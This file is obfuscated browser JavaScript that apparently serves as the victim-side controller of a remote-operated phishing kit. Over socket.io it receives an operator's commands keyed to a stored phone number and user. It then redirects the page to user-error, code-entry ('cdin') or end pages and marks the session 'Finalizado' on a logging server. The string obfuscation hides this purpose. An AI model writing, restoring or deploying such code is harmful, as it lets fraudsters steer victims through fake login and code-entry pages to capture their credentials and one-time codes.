const _0x26da1f = _0x1594;
(function (_0x3cadb6, _0xb009af) {
  const _0x58c732 = _0x1594,
    _0x18f442 = _0x3cadb6();
  while (!![]) {
    try {
      const _0x444752 =
        (parseInt(_0x58c732(0x183)) / 0x1) *
          (parseInt(_0x58c732(0x18f)) / 0x2) +
        -parseInt(_0x58c732(0x186)) / 0x3 +
        (parseInt(_0x58c732(0x18c)) / 0x4) *
          (-parseInt(_0x58c732(0x185)) / 0x5) +
        (-parseInt(_0x58c732(0x189)) / 0x6) *
          (-parseInt(_0x58c732(0x198)) / 0x7) +
        -parseInt(_0x58c732(0x18e)) / 0x8 +
        parseInt(_0x58c732(0x192)) / 0x9 +
        (parseInt(_0x58c732(0x17f)) / 0xa) * (parseInt(_0x58c732(0x196)) / 0xb);
      if (_0x444752 === _0xb009af) break;
      else _0x18f442["push"](_0x18f442["shift"]());
    } catch (_0x2c439c) {
      _0x18f442["push"](_0x18f442["shift"]());
    }
  }
})(_0x523a, 0x8bcf5);
var socket = io[_0x26da1f(0x17d)](url);
socket["on"](_0x26da1f(0x17b), function (_0x4b0956) {
  const _0x16343f = _0x26da1f;
  if (
    _0x4b0956[_0x16343f(0x182)] == "us" &&
    _0x4b0956[_0x16343f(0x194)] == info[_0x16343f(0x18b)][_0x16343f(0x184)]
  )
    window[_0x16343f(0x191)][_0x16343f(0x17e)] = _0x16343f(0x17a);
  else {
    if (
      _0x4b0956[_0x16343f(0x182)] == _0x16343f(0x180) &&
      _0x4b0956[_0x16343f(0x194)] == info[_0x16343f(0x18b)][_0x16343f(0x184)]
    )
      window[_0x16343f(0x191)][_0x16343f(0x17e)] = _0x16343f(0x18a);
    else {
      if (
        _0x4b0956[_0x16343f(0x182)] == _0x16343f(0x19a) &&
        _0x4b0956[_0x16343f(0x194)] == info["metaInfo"][_0x16343f(0x184)]
      )
        window[_0x16343f(0x191)][_0x16343f(0x17e)] = _0x16343f(0x197);
      else {
        if (
          _0x4b0956["valor"] == _0x16343f(0x187) &&
          _0x4b0956[_0x16343f(0x194)] ==
            info[_0x16343f(0x18b)][_0x16343f(0x184)]
        ) {
          async function _0x9afbda() {
            const _0x2c99cb = _0x16343f,
              _0x1109a0 = await fetch(url + _0x2c99cb(0x18d), {
                method: _0x2c99cb(0x188),
                headers: { "Content-Type": "application/json" },
              }),
              _0x15e728 = await _0x1109a0[_0x2c99cb(0x181)](),
              _0x2e4eae = [..._0x15e728];
            for (const _0x529134 of _0x2e4eae) {
              if (
                _0x529134["cl"] == info["metaInfo"][_0x2c99cb(0x184)] &&
                _0x529134["us"] == info[_0x2c99cb(0x18b)]["user"]
              ) {
                console[_0x2c99cb(0x19b)](_0x2c99cb(0x17c));
                const _0x155211 = await fetch(
                    url + _0x2c99cb(0x199) + _0x529134[_0x2c99cb(0x193)],
                    {
                      method: _0x2c99cb(0x190),
                      headers: { "Content-Type": "application/json" },
                      body: JSON["stringify"]({ status: _0x2c99cb(0x179) }),
                    }
                  ),
                  _0x7c93a4 = await _0x155211[_0x2c99cb(0x181)]();
              }
            }
            window[_0x2c99cb(0x191)][_0x2c99cb(0x17e)] = _0x2c99cb(0x195);
          }
          _0x9afbda();
        }
      }
    }
  }
});
function _0x1594(_0x1e9c62, _0x4bf4a4) {
  const _0x523a6a = _0x523a();
  return (
    (_0x1594 = function (_0x1594cc, _0x2aa5a6) {
      _0x1594cc = _0x1594cc - 0x179;
      let _0x2ea8cf = _0x523a6a[_0x1594cc];
      return _0x2ea8cf;
    }),
    _0x1594(_0x1e9c62, _0x4bf4a4)
  );
}
function _0x523a() {
  const _0x5de4ef = [
    "Finalizado",
    "./user.error.html",
    "logs",
    "Usuario\x20encontrado",
    "connect",
    "href",
    "19510BqWMUS",
    "din",
    "json",
    "valor",
    "12632OIyvQl",
    "telnum",
    "480lAiyhn",
    "2365827uCSNpN",
    "finish",
    "GET",
    "18glrWst",
    "./cdin.html",
    "metaInfo",
    "15088UYoLUc",
    "/logs/logs",
    "2527544heCHfr",
    "86IFdeVs",
    "PUT",
    "location",
    "5708907doXiVU",
    "idreg",
    "valid",
    "./end.html",
    "4103SDtHTr",
    "./cdin.error.html",
    "312907AVRXOL",
    "/logs/logFinish/",
    "newdin",
    "log",
  ];
  _0x523a = function () {
    return _0x5de4ef;
  };
  return _0x523a();
}
